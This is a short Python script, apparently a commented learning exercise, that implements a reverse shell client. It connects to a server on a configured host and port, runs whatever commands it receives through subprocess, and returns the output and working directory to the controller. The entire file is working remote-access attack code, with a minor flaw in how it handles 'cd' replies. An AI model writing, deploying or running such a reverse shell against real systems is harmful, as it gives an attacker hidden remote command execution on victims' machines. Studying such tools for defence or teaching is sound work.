#! /bin/python3

import socket #this is so that network communication can happen by using sockets
import subprocess #This will be the library that allows us to communicate on a shell and run commands
import os #This allows us to interact with the OS, for ex ls, cd, rm, etc. 

HOST = "127.0.0.1" #the host of the ip address we are trying to connect to
PORT = 9999 #The port that we want to connect back to on our server
BUFFER = 1024 #the size of the buffer used to recieve data back. (It's a transfer stop for data coming from some source like a network or pins operation)

SEP = "<sep>" #a space // to seperate command outputs

def shell(): 
    while True: 
        command = client_socket.recv(BUFFER).decode() #command (variable) is going to be recieving a command from the server, decoding that into a string, and storing it in the variable command.
        splited_command = command.split() #Simply splits the received command because otherwise it cant be processed by the client

        if splited_command[0].lower() == "cd": #checks to see if the first command is cd
            try: 
                os.chdir(' '.join(splited_command[1:])) #change directory to what is being asked by the server,
            except FileNotFoundError as e: # if it isnt found then it wont work and capture that error message and return it to the server
                output = str(e) 
            else: 
                output = "" #if it works it will return an empty string
        else: #this will be checking if the command is other then cd
            output = subprocess.getoutput(command)  #excutes the command provided and output will be the variable that saves the response.
            cwd = os.getcwd() #gets the current working directory
            message = f"{output}{SEP}{cwd}"  #message will be putting together output and current working directory and the SEP if for the space so it doenst look ugly. 
            client_socket.send(message.encode()) #Sends the message back to the server encoded.



def main(): #this will be establishing the connection with the server
    global client_socket # make this a global variable, the reason for this is that if its a local variable it can not exist outside its function. 
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  #creates a tcp socket
    client_socket.connect((HOST, PORT)) #connects to the host IP and Port 

    cwd = os.getcwd() #gets the current working directory
    client_socket.send(cwd.encode()) #sends cwd to server encoded
    shell() #creates the shell

main() 
